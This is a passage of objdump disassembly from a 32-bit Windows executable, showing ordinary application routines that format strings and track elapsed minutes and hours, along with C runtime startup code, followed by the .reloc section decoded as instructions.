  40178f:	74 07                	je     0x401798
  401791:	b8 01 00 00 00       	mov    $0x1,%eax
  401796:	eb 7a                	jmp    0x401812
  401798:	83 3d 64 21 40 00 00 	cmpl   $0x0,0x402164
  40179f:	74 6a                	je     0x40180b
  4017a1:	6a 00                	push   $0x0
  4017a3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4017a6:	50                   	push   %eax
  4017a7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4017aa:	6a 14                	push   $0x14
  4017ac:	a1 64 21 40 00       	mov    0x402164,%eax
  4017b1:	51                   	push   %ecx
  4017b2:	6a 14                	push   $0x14
  4017b4:	51                   	push   %ecx
  4017b5:	68 07 a0 00 00       	push   $0xa007
  4017ba:	50                   	push   %eax
  4017bb:	ff 15 a0 31 40 00    	call   *0x4031a0
  4017c1:	85 c0                	test   %eax,%eax
  4017c3:	74 46                	je     0x40180b
  4017c5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4017c8:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4017cb:	89 46 0c             	mov    %eax,0xc(%esi)
  4017ce:	89 0e                	mov    %ecx,(%esi)
  4017d0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4017d3:	2b 05 90 21 40 00    	sub    0x402190,%eax
  4017d9:	83 f8 01             	cmp    $0x1,%eax
  4017dc:	1b c0                	sbb    %eax,%eax
  4017de:	40                   	inc    %eax
  4017df:	89 46 04             	mov    %eax,0x4(%esi)
  4017e2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4017e5:	2b 05 94 21 40 00    	sub    0x402194,%eax
  4017eb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4017ee:	83 f8 01             	cmp    $0x1,%eax
  4017f1:	1b c0                	sbb    %eax,%eax
  4017f3:	40                   	inc    %eax
  4017f4:	89 46 08             	mov    %eax,0x8(%esi)
  4017f7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4017fa:	89 0d 90 21 40 00    	mov    %ecx,0x402190
  401800:	a3 94 21 40 00       	mov    %eax,0x402194
  401805:	89 4e 10             	mov    %ecx,0x10(%esi)
  401808:	89 46 14             	mov    %eax,0x14(%esi)
  40180b:	83 3e 01             	cmpl   $0x1,(%esi)
  40180e:	1b c0                	sbb    %eax,%eax
  401810:	f7 d8                	neg    %eax
  401812:	5e                   	pop    %esi
  401813:	8b e5                	mov    %ebp,%esp
  401815:	5d                   	pop    %ebp
  401816:	c2 04 00             	ret    $0x4
  401819:	33 c9                	xor    %ecx,%ecx
  40181b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40181f:	39 48 04             	cmp    %ecx,0x4(%eax)
  401822:	74 05                	je     0x401829
  401824:	b9 02 00 00 00       	mov    $0x2,%ecx
  401829:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  40182d:	74 01                	je     0x401830
  40182f:	41                   	inc    %ecx
  401830:	3b 0d 68 21 40 00    	cmp    0x402168,%ecx
  401836:	74 1b                	je     0x401853
  401838:	50                   	push   %eax
  401839:	89 0d 68 21 40 00    	mov    %ecx,0x402168
  40183f:	ff 34 8d 6c 21 40 00 	push   0x40216c(,%ecx,4)
  401846:	ff 74 24 10          	push   0x10(%esp)
  40184a:	ff 74 24 10          	push   0x10(%esp)
  40184e:	e8 84 fe ff ff       	call   0x4016d7
  401853:	c2 0c 00             	ret    $0xc
  401856:	83 ec 24             	sub    $0x24,%esp
  401859:	53                   	push   %ebx
  40185a:	56                   	push   %esi
  40185b:	57                   	push   %edi
  40185c:	55                   	push   %ebp
  40185d:	ff 74 24 3c          	push   0x3c(%esp)
  401861:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  401865:	57                   	push   %edi
  401866:	ff 15 ec 31 40 00    	call   *0x4031ec
  40186c:	8b f0                	mov    %eax,%esi
  40186e:	8d 44 24 24          	lea    0x24(%esp),%eax
  401872:	50                   	push   %eax
  401873:	56                   	push   %esi
  401874:	ff 15 f0 31 40 00    	call   *0x4031f0
  40187a:	56                   	push   %esi
  40187b:	ff 15 30 32 40 00    	call   *0x403230
  401881:	8b e8                	mov    %eax,%ebp
  401883:	6a 00                	push   $0x0
  401885:	6a 00                	push   $0x0
  401887:	6a 31                	push   $0x31
  401889:	56                   	push   %esi
  40188a:	ff 15 cc 31 40 00    	call   *0x4031cc
  401890:	50                   	push   %eax
  401891:	55                   	push   %ebp
  401892:	ff 15 8c 31 40 00    	call   *0x40318c
  401898:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40189c:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  4018a0:	89 44 24 10          	mov    %eax,0x10(%esp)
  4018a4:	51                   	push   %ecx
  4018a5:	53                   	push   %ebx
  4018a6:	ff 15 98 31 40 00    	call   *0x403198
  4018ac:	50                   	push   %eax
  4018ad:	53                   	push   %ebx
  4018ae:	55                   	push   %ebp
  4018af:	ff 15 90 31 40 00    	call   *0x403190
  4018b5:	ff 74 24 10          	push   0x10(%esp)
  4018b9:	55                   	push   %ebp
  4018ba:	ff 15 8c 31 40 00    	call   *0x40318c
  4018c0:	55                   	push   %ebp
  4018c1:	56                   	push   %esi
  4018c2:	ff 15 2c 32 40 00    	call   *0x40322c
  4018c8:	81 7c 24 3c ee 03 00 	cmpl   $0x3ee,0x3c(%esp)
  4018cf:	00 
  4018d0:	75 0c                	jne    0x4018de
  4018d2:	8b 44 24 30          	mov    0x30(%esp),%eax
  4018d6:	2b 44 24 20          	sub    0x20(%esp),%eax
  4018da:	89 44 24 28          	mov    %eax,0x28(%esp)
  4018de:	8b 44 24 24          	mov    0x24(%esp),%eax
  4018e2:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4018e6:	8b 2d f4 31 40 00    	mov    0x4031f4,%ebp
  4018ec:	89 44 24 14          	mov    %eax,0x14(%esp)
  4018f0:	8d 44 24 14          	lea    0x14(%esp),%eax
  4018f4:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4018f8:	50                   	push   %eax
  4018f9:	57                   	push   %edi
  4018fa:	ff d5                	call   *%ebp
  4018fc:	6a 00                	push   $0x0
  4018fe:	ff 74 24 24          	push   0x24(%esp)
  401902:	ff 74 24 24          	push   0x24(%esp)
  401906:	ff 74 24 24          	push   0x24(%esp)
  40190a:	ff 74 24 24          	push   0x24(%esp)
  40190e:	68 e9 03 00 00       	push   $0x3e9
  401913:	57                   	push   %edi
  401914:	ff 15 ec 31 40 00    	call   *0x4031ec
  40191a:	50                   	push   %eax
  40191b:	8b 2d 40 32 40 00    	mov    0x403240,%ebp
  401921:	56                   	push   %esi
  401922:	ff d5                	call   *%ebp
  401924:	53                   	push   %ebx
  401925:	56                   	push   %esi
  401926:	ff 15 08 32 40 00    	call   *0x403208
  40192c:	5d                   	pop    %ebp
  40192d:	5f                   	pop    %edi
  40192e:	5e                   	pop    %esi
  40192f:	5b                   	pop    %ebx
  401930:	83 c4 24             	add    $0x24,%esp
  401933:	c2 0c 00             	ret    $0xc
  401936:	55                   	push   %ebp
  401937:	33 c0                	xor    %eax,%eax
  401939:	8b ec                	mov    %esp,%ebp
  40193b:	53                   	push   %ebx
  40193c:	56                   	push   %esi
  40193d:	57                   	push   %edi
  40193e:	33 ff                	xor    %edi,%edi
  401940:	8b 75 0c             	mov    0xc(%ebp),%esi
  401943:	39 46 04             	cmp    %eax,0x4(%esi)
  401946:	74 05                	je     0x40194d
  401948:	b8 01 00 00 00       	mov    $0x1,%eax
  40194d:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  401951:	74 05                	je     0x401958
  401953:	bf 01 00 00 00       	mov    $0x1,%edi
  401958:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40195b:	3b 05 84 21 40 00    	cmp    0x402184,%eax
  401961:	75 04                	jne    0x401967
  401963:	85 db                	test   %ebx,%ebx
  401965:	74 2a                	je     0x401991
  401967:	83 3d 8c 21 40 00 00 	cmpl   $0x0,0x40218c
  40196e:	a3 84 21 40 00       	mov    %eax,0x402184
  401973:	74 1c                	je     0x401991
  401975:	ff 34 85 50 21 40 00 	push   0x402150(,%eax,4)
  40197c:	6a 00                	push   $0x0
  40197e:	68 72 01 00 00       	push   $0x172
  401983:	68 ec 03 00 00       	push   $0x3ec
  401988:	ff 75 08             	push   0x8(%ebp)
  40198b:	ff 15 24 32 40 00    	call   *0x403224
  401991:	3b 3d 88 21 40 00    	cmp    0x402188,%edi
  401997:	75 04                	jne    0x40199d
  401999:	85 db                	test   %ebx,%ebx
  40199b:	74 2b                	je     0x4019c8
  40199d:	83 3d 8c 21 40 00 00 	cmpl   $0x0,0x40218c
  4019a4:	89 3d 88 21 40 00    	mov    %edi,0x402188
  4019aa:	74 1c                	je     0x4019c8
  4019ac:	ff 34 bd 50 21 40 00 	push   0x402150(,%edi,4)
  4019b3:	6a 00                	push   $0x0
  4019b5:	68 72 01 00 00       	push   $0x172
  4019ba:	68 eb 03 00 00       	push   $0x3eb
  4019bf:	ff 75 08             	push   0x8(%ebp)
  4019c2:	ff 15 24 32 40 00    	call   *0x403224
  4019c8:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4019cc:	75 04                	jne    0x4019d2
  4019ce:	85 db                	test   %ebx,%ebx
  4019d0:	74 2b                	je     0x4019fd
  4019d2:	ff 76 10             	push   0x10(%esi)
  4019d5:	68 bd 04 00 00       	push   $0x4bd
  4019da:	e8 e3 01 00 00       	call   0x401bc2
  4019df:	83 c4 08             	add    $0x8,%esp
  4019e2:	8b f8                	mov    %eax,%edi
  4019e4:	57                   	push   %edi
  4019e5:	68 ed 03 00 00       	push   $0x3ed
  4019ea:	ff 75 08             	push   0x8(%ebp)
  4019ed:	e8 64 fe ff ff       	call   0x401856
  4019f2:	57                   	push   %edi
  4019f3:	8b 3d ac 31 40 00    	mov    0x4031ac,%edi
  4019f9:	ff d7                	call   *%edi
  4019fb:	eb 06                	jmp    0x401a03
  4019fd:	8b 3d ac 31 40 00    	mov    0x4031ac,%edi
  401a03:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  401a07:	75 04                	jne    0x401a0d
  401a09:	85 db                	test   %ebx,%ebx
  401a0b:	74 23                	je     0x401a30
  401a0d:	ff 76 14             	push   0x14(%esi)
  401a10:	68 be 04 00 00       	push   $0x4be
  401a15:	e8 a8 01 00 00       	call   0x401bc2
  401a1a:	83 c4 08             	add    $0x8,%esp
  401a1d:	8b f0                	mov    %eax,%esi
  401a1f:	56                   	push   %esi
  401a20:	68 ee 03 00 00       	push   $0x3ee
  401a25:	ff 75 08             	push   0x8(%ebp)
  401a28:	e8 29 fe ff ff       	call   0x401856
  401a2d:	56                   	push   %esi
  401a2e:	ff d7                	call   *%edi
  401a30:	5f                   	pop    %edi
  401a31:	5e                   	pop    %esi
  401a32:	5b                   	pop    %ebx
  401a33:	5d                   	pop    %ebp
  401a34:	c2 0c 00             	ret    $0xc
  401a37:	53                   	push   %ebx
  401a38:	56                   	push   %esi
  401a39:	57                   	push   %edi
  401a3a:	55                   	push   %ebp
  401a3b:	33 ff                	xor    %edi,%edi
  401a3d:	39 7c 24 1c          	cmp    %edi,0x1c(%esp)
  401a41:	74 05                	je     0x401a48
  401a43:	bf 01 00 00 00       	mov    $0x1,%edi
  401a48:	8b 74 24 18          	mov    0x18(%esp),%esi
  401a4c:	8b 06                	mov    (%esi),%eax
  401a4e:	3b 05 98 21 40 00    	cmp    0x402198,%eax
  401a54:	74 23                	je     0x401a79
  401a56:	bf 01 00 00 00       	mov    $0x1,%edi
  401a5b:	8b 1d 9c 31 40 00    	mov    0x40319c,%ebx
  401a61:	a3 98 21 40 00       	mov    %eax,0x402198
  401a66:	ff d3                	call   *%ebx
  401a68:	c7 05 9c 21 40 00 00 	movl   $0x0,0x40219c
  401a6f:	00 00 00 
  401a72:	a3 a0 21 40 00       	mov    %eax,0x4021a0
  401a77:	eb 06                	jmp    0x401a7f
  401a79:	8b 1d 9c 31 40 00    	mov    0x40319c,%ebx
  401a7f:	83 3d 9c 21 40 00 14 	cmpl   $0x14,0x40219c
  401a86:	72 0f                	jb     0x401a97
  401a88:	c7 05 9c 21 40 00 00 	movl   $0x0,0x40219c
  401a8f:	00 00 00 
  401a92:	bf 01 00 00 00       	mov    $0x1,%edi
  401a97:	85 ff                	test   %edi,%edi
  401a99:	0f 84 16 01 00 00    	je     0x401bb5
  401a9f:	ff d3                	call   *%ebx
  401aa1:	2b 05 a0 21 40 00    	sub    0x4021a0,%eax
  401aa7:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  401aac:	2b d2                	sub    %edx,%edx
  401aae:	bb 3c 00 00 00       	mov    $0x3c,%ebx
  401ab3:	f7 f1                	div    %ecx
  401ab5:	2b d2                	sub    %edx,%edx
  401ab7:	f7 f3                	div    %ebx
  401ab9:	8b f8                	mov    %eax,%edi
  401abb:	3b 3d a4 21 40 00    	cmp    0x4021a4,%edi
  401ac1:	75 0d                	jne    0x401ad0
  401ac3:	83 3d a4 21 40 00 00 	cmpl   $0x0,0x4021a4
  401aca:	0f 85 e5 00 00 00    	jne    0x401bb5
  401ad0:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  401ad5:	8b c7                	mov    %edi,%eax
  401ad7:	2b d2                	sub    %edx,%edx
  401ad9:	8b e9                	mov    %ecx,%ebp
  401adb:	f7 f1                	div    %ecx
  401add:	8b da                	mov    %edx,%ebx
  401adf:	8b c7                	mov    %edi,%eax
  401ae1:	2b d2                	sub    %edx,%edx
  401ae3:	89 3d a4 21 40 00    	mov    %edi,0x4021a4
  401ae9:	f7 f5                	div    %ebp
  401aeb:	8b f8                	mov    %eax,%edi
  401aed:	33 ed                	xor    %ebp,%ebp
  401aef:	ff 76 0c             	push   0xc(%esi)
  401af2:	68 b3 04 00 00       	push   $0x4b3
  401af7:	e8 c6 00 00 00       	call   0x401bc2
  401afc:	83 c4 08             	add    $0x8,%esp
  401aff:	8b f0                	mov    %eax,%esi
  401b01:	85 ff                	test   %edi,%edi
  401b03:	75 04                	jne    0x401b09
  401b05:	85 db                	test   %ebx,%ebx
  401b07:	74 58                	je     0x401b61
  401b09:	85 db                	test   %ebx,%ebx
  401b0b:	74 38                	je     0x401b45
  401b0d:	85 ff                	test   %edi,%edi
  401b0f:	74 26                	je     0x401b37
  401b11:	b8 01 00 00 00       	mov    $0x1,%eax
  401b16:	83 ff 01             	cmp    $0x1,%edi
  401b19:	76 0e                	jbe    0x401b29
  401b1b:	3b c3                	cmp    %ebx,%eax
  401b1d:	1b c0                	sbb    %eax,%eax
  401b1f:	83 e0 02             	and    $0x2,%eax
  401b22:	05 b9 04 00 00       	add    $0x4b9,%eax
  401b27:	eb 2b                	jmp    0x401b54
  401b29:	3b c3                	cmp    %ebx,%eax
  401b2b:	1b c0                	sbb    %eax,%eax
  401b2d:	83 e0 02             	and    $0x2,%eax
  401b30:	05 b8 04 00 00       	add    $0x4b8,%eax
  401b35:	eb 1d                	jmp    0x401b54
  401b37:	b8 01 00 00 00       	mov    $0x1,%eax
  401b3c:	3b c3                	cmp    %ebx,%eax
  401b3e:	b8 b5 04 00 00       	mov    $0x4b5,%eax
  401b43:	eb 0c                	jmp    0x401b51
  401b45:	b8 01 00 00 00       	mov    $0x1,%eax
  401b4a:	3b c7                	cmp    %edi,%eax
  401b4c:	b8 b7 04 00 00       	mov    $0x4b7,%eax
  401b51:	83 d0 ff             	adc    $0xffffffff,%eax
  401b54:	53                   	push   %ebx
  401b55:	57                   	push   %edi
  401b56:	50                   	push   %eax
  401b57:	e8 66 00 00 00       	call   0x401bc2
  401b5c:	83 c4 0c             	add    $0xc,%esp
  401b5f:	8b e8                	mov    %eax,%ebp
  401b61:	55                   	push   %ebp
  401b62:	56                   	push   %esi
  401b63:	68 bc 04 00 00       	push   $0x4bc
  401b68:	e8 55 00 00 00       	call   0x401bc2
  401b6d:	83 c4 0c             	add    $0xc,%esp
  401b70:	8b f8                	mov    %eax,%edi
  401b72:	85 f6                	test   %esi,%esi
  401b74:	74 0b                	je     0x401b81
  401b76:	56                   	push   %esi
  401b77:	8b 35 ac 31 40 00    	mov    0x4031ac,%esi
  401b7d:	ff d6                	call   *%esi
  401b7f:	eb 06                	jmp    0x401b87
  401b81:	8b 35 ac 31 40 00    	mov    0x4031ac,%esi
  401b87:	85 ed                	test   %ebp,%ebp
  401b89:	74 03                	je     0x401b8e
  401b8b:	55                   	push   %ebp
  401b8c:	ff d6                	call   *%esi
  401b8e:	57                   	push   %edi
  401b8f:	68 ea 03 00 00       	push   $0x3ea
  401b94:	ff 74 24 1c          	push   0x1c(%esp)
  401b98:	ff 15 34 32 40 00    	call   *0x403234
  401b9e:	83 3d 80 21 40 00 00 	cmpl   $0x0,0x402180
  401ba5:	74 08                	je     0x401baf
  401ba7:	a1 80 21 40 00       	mov    0x402180,%eax
  401bac:	50                   	push   %eax
  401bad:	ff d6                	call   *%esi
  401baf:	89 3d 80 21 40 00    	mov    %edi,0x402180
  401bb5:	5d                   	pop    %ebp
  401bb6:	ff 05 9c 21 40 00    	incl   0x40219c
  401bbc:	5f                   	pop    %edi
  401bbd:	5e                   	pop    %esi
  401bbe:	5b                   	pop    %ebx
  401bbf:	c2 0c 00             	ret    $0xc
  401bc2:	55                   	push   %ebp
  401bc3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401bc7:	8b ec                	mov    %esp,%ebp
  401bc9:	81 ec 08 01 00 00    	sub    $0x108,%esp
  401bcf:	68 00 01 00 00       	push   $0x100
  401bd4:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  401bda:	51                   	push   %ecx
  401bdb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401bde:	ff 75 08             	push   0x8(%ebp)
  401be1:	a1 44 20 40 00       	mov    0x402044,%eax
  401be6:	50                   	push   %eax
  401be7:	ff 15 0c 32 40 00    	call   *0x40320c
  401bed:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  401bf0:	8d 55 fc             	lea    -0x4(%ebp),%edx
  401bf3:	51                   	push   %ecx
  401bf4:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401bfa:	6a 00                	push   $0x0
  401bfc:	52                   	push   %edx
  401bfd:	6a 00                	push   $0x0
  401bff:	6a 00                	push   $0x0
  401c01:	50                   	push   %eax
  401c02:	68 00 05 00 00       	push   $0x500
  401c07:	ff 15 a8 31 40 00    	call   *0x4031a8
  401c0d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c10:	8b e5                	mov    %ebp,%esp
  401c12:	5d                   	pop    %ebp
  401c13:	c3                   	ret
  401c14:	83 3d 60 21 40 00 00 	cmpl   $0x0,0x402160
  401c1b:	74 16                	je     0x401c33
  401c1d:	6a 01                	push   $0x1
  401c1f:	ff 74 24 08          	push   0x8(%esp)
  401c23:	ff 15 38 32 40 00    	call   *0x403238
  401c29:	c7 05 60 21 40 00 00 	movl   $0x0,0x402160
  401c30:	00 00 00 
  401c33:	6a 00                	push   $0x0
  401c35:	a1 68 21 40 00       	mov    0x402168,%eax
  401c3a:	ff 34 85 6c 21 40 00 	push   0x40216c(,%eax,4)
  401c41:	6a 02                	push   $0x2
  401c43:	ff 74 24 10          	push   0x10(%esp)
  401c47:	e8 8b fa ff ff       	call   0x4016d7
  401c4c:	c2 04 00             	ret    $0x4
  401c4f:	83 7c 24 08 53       	cmpl   $0x53,0x8(%esp)
  401c54:	75 0e                	jne    0x401c64
  401c56:	8b 44 24 10          	mov    0x10(%esp),%eax
  401c5a:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401c5f:	8b 40 0c             	mov    0xc(%eax),%eax
  401c62:	eb 09                	jmp    0x401c6d
  401c64:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401c68:	b9 0a 00 00 00       	mov    $0xa,%ecx
  401c6d:	ff 74 24 04          	push   0x4(%esp)
  401c71:	51                   	push   %ecx
  401c72:	68 d0 21 40 00       	push   $0x4021d0
  401c77:	50                   	push   %eax
  401c78:	ff 15 3c 32 40 00    	call   *0x40323c
  401c7e:	c2 10 00             	ret    $0x10
  401c81:	cc                   	int3
  401c82:	cc                   	int3
  401c83:	cc                   	int3
  401c84:	cc                   	int3
  401c85:	cc                   	int3
  401c86:	cc                   	int3
  401c87:	cc                   	int3
  401c88:	cc                   	int3
  401c89:	cc                   	int3
  401c8a:	cc                   	int3
  401c8b:	cc                   	int3
  401c8c:	cc                   	int3
  401c8d:	cc                   	int3
  401c8e:	cc                   	int3
  401c8f:	cc                   	int3
  401c90:	55                   	push   %ebp
  401c91:	8b ec                	mov    %esp,%ebp
  401c93:	83 ec 38             	sub    $0x38,%esp
  401c96:	53                   	push   %ebx
  401c97:	56                   	push   %esi
  401c98:	57                   	push   %edi
  401c99:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401c9c:	89 6d d8             	mov    %ebp,-0x28(%ebp)
  401c9f:	c7 45 d4 ff ff ff ff 	movl   $0xffffffff,-0x2c(%ebp)
  401ca6:	c7 45 d0 18 22 40 00 	movl   $0x402218,-0x30(%ebp)
  401cad:	c7 45 cc 4e 1e 40 00 	movl   $0x401e4e,-0x34(%ebp)
  401cb4:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401cba:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401cbd:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401cc0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401cc6:	a1 7c 32 40 00       	mov    0x40327c,%eax
  401ccb:	8b 0d 30 22 40 00    	mov    0x402230,%ecx
  401cd1:	89 08                	mov    %ecx,(%eax)
  401cd3:	a1 78 32 40 00       	mov    0x403278,%eax
  401cd8:	8b 0d 40 22 40 00    	mov    0x402240,%ecx
  401cde:	89 08                	mov    %ecx,(%eax)
  401ce0:	e8 3b 01 00 00       	call   0x401e20
  401ce5:	a1 10 22 40 00       	mov    0x402210,%eax
  401cea:	50                   	push   %eax
  401ceb:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401cee:	50                   	push   %eax
  401cef:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401cf2:	50                   	push   %eax
  401cf3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401cf6:	50                   	push   %eax
  401cf7:	e8 34 01 00 00       	call   0x401e30
  401cfc:	83 c4 10             	add    $0x10,%esp
  401cff:	68 10 40 40 00       	push   $0x404010
  401d04:	68 00 40 40 00       	push   $0x404000
  401d09:	e8 28 01 00 00       	call   0x401e36
  401d0e:	83 c4 08             	add    $0x8,%esp
  401d11:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  401d18:	a1 74 32 40 00       	mov    0x403274,%eax
  401d1d:	8b 00                	mov    (%eax),%eax
  401d1f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d22:	80 38 20             	cmpb   $0x20,(%eax)
  401d25:	7e 09                	jle    0x401d30
  401d27:	40                   	inc    %eax
  401d28:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d2b:	80 38 20             	cmpb   $0x20,(%eax)
  401d2e:	7f f7                	jg     0x401d27
  401d30:	80 38 00             	cmpb   $0x0,(%eax)
  401d33:	74 0e                	je     0x401d43
  401d35:	80 38 20             	cmpb   $0x20,(%eax)
  401d38:	7f 09                	jg     0x401d43
  401d3a:	40                   	inc    %eax
  401d3b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d3e:	80 38 00             	cmpb   $0x0,(%eax)
  401d41:	75 f2                	jne    0x401d35
  401d43:	6a 0a                	push   $0xa
  401d45:	50                   	push   %eax
  401d46:	6a 00                	push   $0x0
  401d48:	6a 00                	push   $0x0
  401d4a:	e8 0b 01 00 00       	call   0x401e5a
  401d4f:	50                   	push   %eax
  401d50:	e8 ab f2 ff ff       	call   0x401000
  401d55:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401d58:	50                   	push   %eax
  401d59:	e8 de 00 00 00       	call   0x401e3c
  401d5e:	e9 7f 00 00 00       	jmp    0x401de2
  401d63:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401d66:	8b 00                	mov    (%eax),%eax
  401d68:	8b 00                	mov    (%eax),%eax
  401d6a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d6d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d70:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401d73:	50                   	push   %eax
  401d74:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401d77:	50                   	push   %eax
  401d78:	e8 c5 00 00 00       	call   0x401e42
  401d7d:	83 c4 08             	add    $0x8,%esp
  401d80:	c3                   	ret
  401d81:	8b 65 f0             	mov    -0x10(%ebp),%esp
  401d84:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401d87:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d8a:	3d 25 00 00 c0       	cmp    $0xc0000025,%eax
  401d8f:	74 3e                	je     0x401dcf
  401d91:	3d 26 00 00 c0       	cmp    $0xc0000026,%eax
  401d96:	74 2d                	je     0x401dc5
  401d98:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  401d9d:	74 11                	je     0x401db0
  401d9f:	3d fd 00 00 c0       	cmp    $0xc00000fd,%eax
  401da4:	75 33                	jne    0x401dd9
  401da6:	6a 00                	push   $0x0
  401da8:	e8 9b 00 00 00       	call   0x401e48
  401dad:	83 c4 04             	add    $0x4,%esp
  401db0:	a1 64 32 40 00       	mov    0x403264,%eax
  401db5:	c7 00 3c 1e 40 00    	movl   $0x401e3c,(%eax)
  401dbb:	6a 03                	push   $0x3
  401dbd:	e8 86 00 00 00       	call   0x401e48
  401dc2:	83 c4 04             	add    $0x4,%esp
  401dc5:	6a 17                	push   $0x17
  401dc7:	e8 7c 00 00 00       	call   0x401e48
  401dcc:	83 c4 04             	add    $0x4,%esp
  401dcf:	6a 16                	push   $0x16
  401dd1:	e8 72 00 00 00       	call   0x401e48
  401dd6:	83 c4 04             	add    $0x4,%esp
  401dd9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401ddc:	50                   	push   %eax
  401ddd:	e8 72 00 00 00       	call   0x401e54
  401de2:	83 c4 04             	add    $0x4,%esp
  401de5:	c7 45 d4 ff ff ff ff 	movl   $0xffffffff,-0x2c(%ebp)
  401dec:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401def:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401df5:	5f                   	pop    %edi
  401df6:	5e                   	pop    %esi
  401df7:	5b                   	pop    %ebx
  401df8:	8b e5                	mov    %ebp,%esp
  401dfa:	5d                   	pop    %ebp
  401dfb:	c3                   	ret
  401dfc:	8d 64 24 00          	lea    0x0(%esp),%esp
  401e00:	c7 05 10 22 40 00 01 	movl   $0x1,0x402210
  401e07:	00 00 00 
  401e0a:	c3                   	ret
  401e0b:	05 00 00 00 00       	add    $0x0,%eax
  401e10:	ff 25 70 32 40 00    	jmp    *0x403270
  401e16:	ff 25 6c 32 40 00    	jmp    *0x40326c
  401e1c:	cc                   	int3
  401e1d:	cc                   	int3
  401e1e:	cc                   	int3
  401e1f:	cc                   	int3
  401e20:	c3                   	ret
  401e21:	8d 64 24 00          	lea    0x0(%esp),%esp
  401e25:	8d 64 24 00          	lea    0x0(%esp),%esp
  401e29:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401e30:	ff 25 68 32 40 00    	jmp    *0x403268
  401e36:	ff 25 4c 32 40 00    	jmp    *0x40324c
  401e3c:	ff 25 60 32 40 00    	jmp    *0x403260
  401e42:	ff 25 5c 32 40 00    	jmp    *0x40325c
  401e48:	ff 25 58 32 40 00    	jmp    *0x403258
  401e4e:	ff 25 54 32 40 00    	jmp    *0x403254
  401e54:	ff 25 50 32 40 00    	jmp    *0x403250
  401e5a:	ff 25 a4 31 40 00    	jmp    *0x4031a4

Disassembly of section .reloc:

0040b000 <.reloc>:
  40b000:	00 10                	add    %dl,(%eax)
  40b002:	00 00                	add    %al,(%eax)
  40b004:	8c 01                	mov    %es,(%ecx)
  40b006:	00 00                	add    %al,(%eax)
  40b008:	0d 30 13 30 34       	or     $0x34301330,%eax
  40b00d:	30 39                	xor    %bh,(%ecx)
  40b00f:	30 59 30             	xor    %bl,0x30(%ecx)
  40b012:	5e                   	pop    %esi
  40b013:	30 8b 30 a7 30 bc    	xor    %cl,-0x43cf58d0(%ebx)
  40b019:	30 cc                	xor    %cl,%ah
  40b01b:	30 e1                	xor    %ah,%cl
  40b01d:	30 ee                	xor    %ch,%dh
  40b01f:	30 05 31 0a 31 1e    	xor    %al,0x1e310a31
  40b025:	31 2b                	xor    %ebp,(%ebx)
  40b027:	31 3a                	xor    %edi,(%edx)
  40b029:	31 40 31             	xor    %eax,0x31(%eax)
  40b02c:	4a                   	dec    %edx
  40b02d:	31 60 31             	xor    %esp,0x31(%eax)
  40b030:	77 31                	ja     0x40b063
  40b032:	7e 31                	jle    0x40b065
  40b034:	85 31                	test   %esi,(%ecx)
  40b036:	8c 31                	mov    %?,(%ecx)
  40b038:	93                   	xchg   %eax,%ebx
  40b039:	31 9a 31 c0 31 cd    	xor    %ebx,-0x32ce3fcf(%edx)
  40b03f:	31 ff                	xor    %edi,%edi
  40b041:	31 22                	xor    %esp,(%edx)
  40b043:	32 29                	xor    (%ecx),%ch
  40b045:	32 4c 32 53          	xor    0x53(%edx,%esi,1),%cl
  40b049:	32 5f 32             	xor    0x32(%edi),%bl
  40b04c:	7f 32                	jg     0x40b080
  40b04e:	9d                   	popf
  40b04f:	32 b0 32 ce 32 e8    	xor    -0x17cd31ce(%eax),%dh
  40b055:	32 fb                	xor    %bl,%bh
  40b057:	32 8b 33 95 33 a0    	xor    -0x5fcc6acd(%ebx),%cl
